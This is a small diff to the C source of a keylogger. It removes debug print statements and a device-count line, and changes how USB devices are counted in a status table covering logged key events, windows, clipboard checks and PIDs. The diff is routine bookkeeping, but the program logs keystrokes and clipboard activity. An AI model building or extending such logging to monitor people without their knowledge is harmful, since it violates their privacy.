@@ -185,7 +185,6 @@ size_t keylogger_count_table_rows(const char *TABLE){
   ASSERT_DB_STATEMENT(db_st);
   last_qty_checks++;
   free(sql);
-  PRINT(TABLE, db_st.qty);
   return(db_st.qty);
 }
 
@@ -283,7 +282,6 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     last_clipboard_check_ts = cur_ts;
   }
   if (updated_dur > check_qty_interval_ms) {
-    PRINT(updated_dur, check_qty_interval_ms);
     tbl_events_qty    = keylogger_count_table_rows("events");
     tbl_windows_qty   = keylogger_count_table_rows("windows");
     table_size_bytes  = keylogger_get_db_size();
@@ -308,7 +306,6 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
             "\n\t  | # windows:     |%d|"
             "\n\t  | active window: |%d|"
             "\n\t  | focused pid:   |%d|"
-            "\n\t  | # devices:     |" AC_BOLD "%lu" AC_RESETALL
             "\n\t  | # displays:    |%d|"
             "\n\t  | # usb devices: |%lu|"
             "\n\t  | # pids:        |%lu|"
@@ -332,9 +329,8 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
             windows_qty,
             LOGGED_EVENT->active_window_id,
             LOGGED_EVENT->focused_pid,
-            LOGGED_EVENT->devices_qty,
             display_qty,
-            LOGGED_EVENT->usb_devices_qty,
+            vector_size(LOGGED_EVENT->usb_devices_v),
             vector_size(pids_v),
             LOGGED_EVENT->event_flags,
             LOGGED_EVENT->event_flag,
